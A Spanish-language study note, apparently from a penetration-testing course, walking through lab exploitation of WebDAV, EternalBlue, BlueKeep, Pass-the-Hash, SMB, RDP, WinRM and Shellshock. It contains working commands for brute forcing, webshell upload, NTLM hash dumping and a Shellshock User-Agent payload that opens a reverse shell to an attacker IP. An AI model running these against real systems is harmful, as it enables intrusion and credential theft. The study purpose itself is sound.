13-02-2025 19:22
Status: #idea
Tags: [[Assesment Methodologies]]

- [[#Windows|Windows]]
	- [[#Windows#Servicios comunes a exploits|Servicios comunes a exploits]]
	- [[#Windows#Exploiting WebDAV|Exploiting WebDAV]]
		- [[#Exploiting WebDAV#Herramientas|Herramientas]]
		- [[#Exploiting WebDAV#Demostración|Demostración]]
			- [[#Demostración#Enumeración|Enumeración]]
			- [[#Demostración#Bruteforcing|Bruteforcing]]
			- [[#Demostración#Exploiting|Exploiting]]
	- [[#Windows#EternalBlue (MS17-010 SMB)|EternalBlue (MS17-010 SMB)]]
		- [[#EternalBlue (MS17-010 SMB)#Herramientas|Herramientas]]
		- [[#EternalBlue (MS17-010 SMB)#Pasos|Pasos]]
			- [[#Pasos#AutoBlue|AutoBlue]]
			- [[#Pasos#Metasploit|Metasploit]]
	- [[#Windows#BlueKeep|BlueKeep]]
		- [[#BlueKeep#Herramientas|Herramientas]]
		- [[#BlueKeep#Pasos|Pasos]]
	- [[#Windows#Pass The Hash|Pass The Hash]]
		- [[#Pass The Hash#Herramientas|Herramientas]]
		- [[#Pass The Hash#Pasos|Pasos]]
			- [[#Pasos#Extracción de hashes|Extracción de hashes]]
			- [[#Pasos#Ejecución de psexec|Ejecución de psexec]]
			- [[#Pasos#Ejecución de crackmapexec|Ejecución de crackmapexec]]
			- [[#Pasos#Conclusión|Conclusión]]
	- [[#Windows#SMB|SMB]]
		- [[#SMB#Exploiting|Exploiting]]
	- [[#Windows#RDP|RDP]]
		- [[#RDP#Exploit|Exploit]]
- [[#Linux|Linux]]
	- [[#Linux#Servicios comunes a exploits|Servicios comunes a exploits]]
	- [[#Linux#Shellshock|Shellshock]]
		- [[#Shellshock#Pasos|Pasos]]
			- [[#Pasos#Metasploit|Metasploit]]


# Vulnerability Assessment

Esta sección nos mostrará el proceso de identificar, analizar y priorizar vulnerabilidades en sistemas, redes y aplicaciones. Su objetivo será detectar las posibles debilidades de seguridad antes de que un atacante pueda explotarlas.

En esta etapa, nos encargaremos de identificar las vulnerabilidades, pero no de explotarlas, por lo tanto, usaremos herramientas como Nessus, o MSF.


## Windows

En Windows podremos ver vulnerabilidades como:

- Information disclosure.
- Buffer Overflows.
- Remote Code Execution (RCE).
- Privilege Escalation.
- Denial of Service (DOS).

### Servicios comunes a exploits

Windows de por si tiene varios servicios nativos y diversos protocolos que se ejecutan por defecto.

Estos servicios proporcionan al atacante un vector de ataque que se podría usar para comprometer un equipo.

Aquí tenemos algunos servicios comunes a exploits:

- **Microsoft ISS** (Internet Information Services): 
	- Puerto 80/443. 
	- Es un servidor web que ha desarrollado Microsoft.

- **WebDAV** (Web Distributed Authoring & Versioning):
	- Puerto 80/443.
	- Es una extensión HTTP que permite a los clientes actualizar, borrar, mover o copiar ficheros en un servidor web.

- **SMB/CIFS** (Server Message Block Protocol): 
	- Puerto 445.
	- Es un protocolo para compartir ficheros a través de una red.

- **RDP** (Remote Desktop Protocol):
	- Puerto 3389.
	- Protocolo GUI propietario de Windows para acceder a equipos de manera remota.

- **WinRM** (Windows Remote Management Protocol):
	- Puerto 5986/443.
	- Es un protocolo que permite gestionar equipos de manera remota. Funciona a través de la red y permite ejecutar comandos, administrar servicios, y obtener información del sistema.


### Exploiting WebDAV

El primer paso para exploitear WebDAV será identificar si WebDAV está configurado en el servidor ISS.

Después, podremos hacer un ataque bruteforce para obtener credenciales válidas que nos permitan autenticarnos. Este último paso nos permitirá subir un fichero .asp maligno, que nos permitirá ejecutar comandos o iniciar una reverse shell en el objetivo.

#### Herramientas

- **davtest**: Se usa para escanear, autenticar y exploitear servidores WebDAV. Viene preinstalado en Kali y Parrot OS.

- **cadaver**: Cadaver nos permitirá subir, descargar, ver y editar ficheros, además de manipulación de propiedades, namespaces, colecciones, etc. Viene preinstalado en Kali y Parrot OS también.

#### Demostración

##### Enumeración

Para empezar, tendremos que enumerar si nuestro objetivo tiene WebDAV funcionando, para eso podremos usar nmap y escanear los puertos de este.

```bash
nmap -sV -sC 10.10.10.10
```

Con esto podremos confirmar si está WebDAV funcionando.

Para obtener más información, podremos usar el script de nmap **http-enum** de la siguiente manera:

```bash
nmap -sV -p 80 --script=http-enum
```

Este script nos dará normalmente la carpeta donde se encuentra la instalación de WebDAV.

##### Bruteforcing

Podremos usar hydra para esto, proporcionando una wordlist para los usuarios y otra para las contraseñas:

```bash
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.10.10.10 http-get /webdav/
```

##### Exploiting

Podremos usar **davtest**, y **cadaver** como hemos comentado anteriormente para subir ficheros y conseguir vulnerar el target.

```bash
davtest -auth bob:password_123321 -url http://10.10.10.10/webdav
```

Posteriormente, davtest nos dará una lista de ficheros que se pueden subir al servidor, y que se podrían ejecutar, mostrándonos así las extensiones que se pueden ejecutar.

Una vez que sepamos esto, podremos usar cadaver para vulnerar el objetivo:

```shell
cadaver http://10.10.10.10/webdav
```

Nos pedirá las credenciales, y posteriormente vemos como tenemos una shell que nos permitirá subir ficheros y hacer operaciones básicas.

Buscaremos shells que vengan en Kali por defecto en la ruta **/usr/share/webshells** adaptadas a la extensión que se pueda ejecutar en el servidor WebDAV.

Con este comando podremos subir el shell al servidor WebDAV:

```shell
put /usr/share/webshells/asp/webshell.asp
```

En el caso de que sea asp, si ejecutamos el shell en el servidor, veremos como nos da un input en el que podemos pasar los comandos que queramos, y nos mostrará su respuesta.

### EternalBlue (MS17-010 SMB)

EternalBlue es un exploit desarrollado por la NSA, y que fue filtrado por el grupo Shadow Brokers. 

Este exploit, a grandes rasgos, se encarga de enviar paquetes creados específicamente para que se facilite la ejecución de comandos arbitrarios a través de un servidor SMB versión 1. Además, nos proporcionará permisos de administrador.

Este exploit fue la base para WannaCry, que buscaba afectar con el ransomware al mayor número de equipos posibles. 

Este es el listado de versiones de Windows que se ven afectadas:

- Windows Vista
- Windows 7
- Windows Server 2008
- Windows 8.1
- Windows Server 2012
- Windows 10
- Windows Server 2016

Microsoft lanzó un patch, pero aún hay muchos usuarios y compañías que no tienen este parche aplicado.

Existe un módulo auxiliar en metasploit que nos indicará si el sistema se verá afectado por este exploit.

#### Herramientas

[**AutoBlue-MS17-010**](https://github.com/3ndG4me/AutoBlue-MS17-010): Herramienta que nos permite exploitear esta vulnerabilidad sin necesidad de usar Metasploit.

**nmap**: Hay un script llamado **smb-vuln-ms17-010** que nos indicará si el target es vulnerable.

#### Pasos

##### AutoBlue

Necesitaremos instalar las dependencias con pip, y posteriormente ejecutar el **shell_prep.sh**.

```shell
chmod +x shell_prep.sh
./shell_prep.sh
```

Indicaremos el LHOST que necesitemos en el script (la IP de nuestra máquina), y el puerto (LPORT).

Nos preguntará si queremos un meterpreter o una shell cmd normal, seleccionaremos la opción que más nos convenga en el momento.

Veremos como ha generado ficheros, y entre ellos veremos el **sc_x64.bin** y el **sc_x86.bin**, que usaremos dependiendo de la arquitectura del objetivo.

Abriremos un netcat listener, y posteriormente solo tendremos que ejecutar el exploit:

```shell
chmod +x eternalblue_exploit7.py
python eternablue_exploit7.py 10.10.10.12 shellcode/sc_x64.bin
```

Si todo ha ido bien, veremos que en nuestro netcat vemos la shell que ha spawneado.

##### Metasploit

Podremos usar el módulo **exploit/windows/smb/ms17_010_eternalblue**. Tendremos que hacer lo mismo que con AutoBlue, especificar RHOSTS, LHOST, y LPORT. 

Usaremos el comando **exploit**, y si todo ha ido bien, tendremos una nueva shell en meterpreter.

### BlueKeep

Es una vulnerabilidad RDP que permite a los atacantes ejecutar comandos, tener acceso a un sistema Windows y consecuentemente a la red en la que se encuentre el objetivo.

Esta vulnerabilidad fue pública en mayo del 2019, por parte de Microsoft.

BlueKeep permite obtener acceso a un trozo de la memoria kernel, por lo que consecuentemente proporciona ejecución remota de comandos con privilegios máximos.

El listado de versiones de Windows afectadas son:

- XP
- Vista
- Windows 7
- Windows Server 2008 & R2

Hay que tener en cuenta que al ser una vulnerabilidad de la que Microsoft ha hecho disclose, no hay un POC oficial, por lo tanto algunos exploits online pueden contener código malicioso.

> [!TIP] Crasheos en sistema
> Estes tipos de exploits al ser al nivel del kernel, pueden hacer que el sistema haga crash.

#### Herramientas

El exploit BlueKeep tiene un módulo auxiliar de Metasploit, y también hay un módulo que nos permite lanzar el exploit.

#### Pasos

Tendremos que verificar si el puerto de RDP se encuentra abierto (3369). Esto lo puedes hacer con nmap.

Una vez lo verifiquemos, podremos usar el módulo auxiliar **auxiliary/scanner/rdp/cve_2019_0708_bluekeep** para determinar si es vulnerable, y posteriormente podremos usar el **exploit/windows/rdp/cve_0708_bluekeep_rce** para ejecutar el exploit.

Antes de lanzar el exploit, tendremos que determinar cual es el target al que vamos a atacar (sistema operativo), ya que tendremos que indicárselo al exploit. Una vez lo sepamos, podremos hacer un **show targets**, y poner **set target X** con la opción que se adecue al objetivo.

Si el exploit usa un número alto de RAM (Size 250MB), podría hacer que el sistema crashee, por lo tanto tenemos que ser muy cuidadosos si estamos en un entorno real.

Si todo sale bien, tendremos un meterpreter con privilegios elevados.

### Pass The Hash

Pass The Hash es una técnica de exploiting que consiste en capturar o farmear NTLM hashes y utilizarlas para autenticarse en el objetivo de manera legítima.

Este tipo de exploiting nos permite acceso persistente a una máquina vulnerada, ya que si por ejemplo, vulneramos una máquina haciendo exploit en un servicio en concreto, y conseguimos una hash NTLM del administrador, podríamos seguir conectados al servidor remoto aunque se haga el parcheo de ese servicio.

#### Herramientas

Hay varias herramientas que podemos usar para esto, entre ellas el módulo **PsExec de Metasploit**, y **Crackmapexec**.

#### Pasos

##### Extracción de hashes

Para usar los módulos en metasploit buscaremos **badblue**, y usaremos el **badblue_passthru**. Tendremos que indicar nuestro RHOSTS como siempre, y podremos usar el exploit.

Esto nos dará un meterpreter, en el que tendremos que ejecutar el siguiente comando:

```shell
pgrep lsass
```

Que básicamente se encargará de hacer process grabbing a lsass.exe, que es el proceso responsable de manejar la autenticación en Windows, dándonos así las contraseñas almacenadas en memoria.

Posteriormente, usaremos el comando migrate con el número que nos devuelva el pgrep:

```shell
migrate 780
```

Y para verificar que somos el usuario root, haremos **getuid**, y nos debería de dar NT AUTHORITY/SYSTEM.

Ahora solo nos faltaría cargar **kiwi**, y hacer un dump de las hashes:

```shell
load kiwi
lsa_dump_sam
```

Esto nos proporcionará la hash para el administrador y otros usuarios. Posteriormente, podremos usar el comando **hashdump** en el meterpreter para ver las hashes de todos los usuarios.

Mandaremos el meterpreter al background y pasaremos a usar psexec en metasploit.
##### Ejecución de psexec

Usaremos el módulo **exploit/windows/smb/psexec**, y tendremos que cambiar el LPORT, ya que seguramente la sesión de meterpreter que tengas activa ya está en el 4444, y se generará una nueva. Puedes poner algo como 4422.

También tendremos que configurar el **SMBUser** con el nombre de usuario, y **SMBPass** con la hash.


> [!DANGER] SMBPass y el hash que hay que indicar
> Para indicar el hash en psexec tendremos que indicar tanto la hash LM como NTLM, y se conseguirá con el comando hashdump en linux.
> 
> Este nos dará un string similar a esto: 
> Administrator:xxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
> 
> En este caso tendremos que indicar la string: xxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxxxxxxxx, es decir, todo menos el nombre del usuario.


Además, tendremos que especificar el **target** a Command o Native upload (cambia si ves que no funciona), siendo el comando **set target Command.**

Si todo sale bien, podremos ejecutar el exploit y nos daría una meterpreter shell, y haciendo **getuid** deberíamos ver la cuenta con NT AUTHORITY/SYSTEM.

##### Ejecución de crackmapexec

Podremos usar crackmapexec también, con el siguiente comando, donde daremos el usuario en la flag -u y la hash con la flag -H:

```shell
crackmapexec smb 10.10.10.10 -u Administrator -H "hash"
```

Si pone que está pwned, podremos ejecutar comandos con la flag -x posteriormente, por ejemplo:

```shell
crackmapexec smb 10.10.10.10 -u Administrator -H "hash" -x "whoami"
```

Verás que hay errores de python, no les hagas caso, simplemente scrollea arriba y mira el output del comando.

##### Conclusión

Usar uno o otro método va a depender de si ya tenemos acceso previo a la máquina. Si ya la hemos vulnerado, y tenemos una conexión activa, se recomienda usar metasploit con Kiwi, pero si se quiere enumerar sin acceso previo usaremos crackmapexec.


### SMB

SMB se encontrará normalmente en el **puerto 445**, aunque originalmente, estaba en el **puerto 139**.

Posteriormente, en el apartado de Linux, se hablará también de su implementación en este sistema operativo, llamada SAMBA.

SMB utiliza dos niveles de autenticación: **Autenticación por usuario y autenticación por share**.

#### Exploiting

Para ayudarnos a hacer exploit de este servicio, usaremos la utilidad **PsExec**, un reemplazo de Telnet.

La técnica más común de exploit es hacer bruteforcing, y posteriormente usar PsExec para ejecutar comandos en el objetivo.

Para empezar, tendremos que hacer enumeración con nmap para verificar que SMB está funcionando en el servidor:

```shell
nmap -sC -sV demo.ine.local
```

Posteriormente, en metasploit, usaremos el módulo **auxiliary/scanner/smb/smb_login**, con el que configuraremos las opciones necesarias para hacer el bruteforcing: **USER_FILE** y **PASS_FILE**. Si sabemos un nombre de usuario, lo tenemos más fácil, ya que solo tendríamos que poner el PASS_FILE.

Esta parte se ve en más profundidad en [el módulo de Metasploit](Metasploit#SMB).

Una vez tengamos nuestras credenciales, usaremos PsExec, ya sea en su ejecutable, [o en el script de python](https://github.com/fortra/impacket/blob/master/examples/psexec.py), o a través de Metasploit.

```shell
psexec.py Administrator@demo.ine.local cmd.exe
```

Esto nos pedirá las credenciales conseguidas anteriormente, y si todo sale bien, ya tendremos nuestro cmd abierto.

Con Metasploit:

```shell
use exploit/windows/smb/psexec
```

Y tendríamos que configurar el RHOSTS, el SMBUser, SMBPass y las opciones para abrir el meterpreter apuntando a nuestra IP.

Hacemos exploit, y posteriormente ya tenemos nuestra meterpreter.

### RDP

Es un protocolo GUI que nos da acceso remoto a sistemas Windows.

Se encuentra en el puerto 3389 por defecto, pero se puede configurar a cualquier otro puerto.

La autenticación por RDP se realiza con un nombre de usuario, y una contraseña.

El exploit es similar a SMB, ya que haremos bruteforcing para conseguir estas credenciales.

#### Exploit

Haremos un escaneo con nmap, y veremos si el servicio está en el puerto por defecto, o en un puerto alternativo.

Para confirmar esto podremos usar **rdp_scanner** en Metasploit, al que tendremos que darle las opciones RHOSTS y RPORT, hacer un run, y veremos que nos devuelve "Detected RDP on XXXXXXX" en caso de que se trate del servicio RDP.

Para hacer el bruteforcing, usaremos [[Hydra]] de la siguiente manera, siendo 10.10.10.10 el objetivo, y 3389 el puerto en el que se encuentra RDP:

```shell
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt rdp://10.10.10.10 -s 3389
```

Puede que nos salten varios usuarios, a poder ser, intenta esperar a ver si hay suerte y consigues credenciales para una cuenta de administrador.

Posteriormente, podremos usar **xfreerdp** para conectarnos con las credenciales, por ejemplo:

```shell
xfreerdp /u:administrator /p:qwertyuiop /v:10.10.10.10:3389
```

Indicamos que confiamos en el certificado, y nos debería de abrir una sesión RDP.

### WinRM

WinRM es un protocolo que facilita el acceso remoto a sistemas Windows.

Está pensado para administradores de redes, permitiendo así ejecutar comandos en sistemas en la red, y manejar y configurarlos según las necesidades que existan.

Normalmente, está en el **puerto 5985 y 5986** (HTTPS).

#### Exploiting

Para hacer el exploit, usaremos una utilidad llamada **crackmapexec** para identificar la contraseña y el usuario, y **[evil-winrm](https://github.com/Hackplayers/evil-winrm)** para conseguir una shell en el objetivo.

Como siempre, el primer paso es escanear con nmap y verificar que el servicio está corriendo en nuestro objetivo. El banner del servicio no dice explícitamente que es WinRM.

Posteriormente, usaremos crackmapexec para hacer el bruteforce. Vemos como intentamos conseguir acceso en el usuario administrator, ya que es la cuenta que se crea en Windows por defecto, y tiene privilegios elevados.

```shell
crackmapexec
crackmapexec winrm demo.ine.local -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Si todo sale bien, tendremos acceso a credenciales para el usuario.

Para probar que todo funciona bien, podríamos ejecutar este comando con las credenciales anteriores, y nos debería devolver la ejecución del comando "whoami":

```shell
crackmapexec winrm demo.ine.local -u administrator -p tinkerbell -x "whoami"
```

Posteriormente, tendremos que usar evil-winrm para conectarnos y obtener una shell:

```shell
evil-winrm.rb -u administrator -p 'tinkerbell' -i demo.ine.local
```

Este shell lo podríamos convertir en un meterpreter, con el exploit **winrm_script_exec**, poniendo el RHOSTS, RPORT, settings para el listener. También hay que poner la flag FORCE_VBS a true, y las credenciales USERNAME y PASSWORD.

Si todo sale bien, tendremos nuestro meterpreter listo.


---

## Linux

### Servicios comunes a exploits

- **Apache Web Server**: Apache es un servidor muy común, ya que casi un 80% de los servidores de todo internet lo están usando. 
	- Puertos: 80 y 443.

- **SSH** (Secure Shell): Es un protocolo que nos permitirá conectarnos a un servidor de manera remota y ejecutar comandos.
	- Puerto: 22.

- **FTP**: Protocolo que nos permite subir y descargar archivos en un servidor.
	- Puerto: 21.

- **SAMBA**: Es la implementación de SMB en Linux.
	- Puerto: 445.

### Shellshock

Shellshock es el nombre que se la da a una familia de vulnerabilidades, que permitiría al atacante ejecutar comandos a través de Bash, consiguiendo así acceso remoto al sistema con una reverse shell.

La causa de este exploit es por una vulnerabilidad causada por Bash, en la que se ejecutan comandos trailing después de una serie de caracteres.

Para poner en contexto, servidores Apache configurados para correr CGI scripts o .sh scripts, son vulnerables a este ataque.

Los scripts CGI son usados por Apache para ejecutar comandos en el sistema Linux.

#### Pasos

Tendremos que hacer un escaneo con nmap para verificar si verdaderamente el servidor es Apache.

Inspeccionaremos el código de la web, y veremos si se está ejecutando algún script .cgi, y si es así, podremos abrirlo en una pestaña y verificar que funciona.

Para poder saber si es vulnerable o no, tendremos que usar el script **http-shellshock** de nmap, proporcionando la ruta del script como argumento:

```shell
nmap -sV 10.10.10.10 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"
```

Si es vulnerable, nos lo indicará en la salida este script.

Para poder explotarlo, tendremos que poner el proxy con Burp o con Caido, y editar los contenidos de la header del User-Agent, con el siguiente valor:

```headers
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
```

Esto lo que hará es abrir una bash nueva, y leer el contenido del fichero /etc/passwd, obviamente, podremos modificar esto y ejecutar el comando que veamos más conveniente.

Si queremos conseguir un reverse shell, podremos ejecutar un netcat con el comando:

```shell
nc -nlvp 4444
```

Y posteriormente, modificar el User-Agent para que se haga una petición a este listener, especificando la IP de nuestra máquina (eth1):

```shell
User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/IP_KALI/4444 0>&1'
```

Y si todo va bien, tendremos nuestra reverse shell.

##### Metasploit

Todo este proceso lo podemos hacer también con Metasploit, teniendo dos módulos, el auxiliar para confirmar la vulnerabilidad y el exploit para conseguir explotar la vulnerabiliad.

El módulo auxiliar se llama **auxiliary/scanner/http/apache_mod_cgi_bash_env**, y nos proporcionará el uid, gid y groups, ya que ejecutará el comando **id** en caso de que funcione y sea vulnerable.

El módulo para el exploit será **exploit/multi/http/apache_mod_cgi_bash_env_exec**, tendremos que especificar el parámetro RHOSTS y el TARGETURI con la ruta para el script sin la IP (/gettime.cgi). 

Una vez ejecutado, obtendremos un meterpreter en el que tendremos que ejecutar el comando **shell**, seguido de /bin/bash -i para poder generar un bash en el que ejecutar comandos.

```shell
shell
/bin/bash -i
```


> [!TIP] Importancia de LHOST
> Recuerda poner el LHOST a la IP del eth1, ya que si nos los meterpreter no se abrirán.




# Backlinks

```dataview
LIST
FROM [[]]
SORT file.name ASC
```
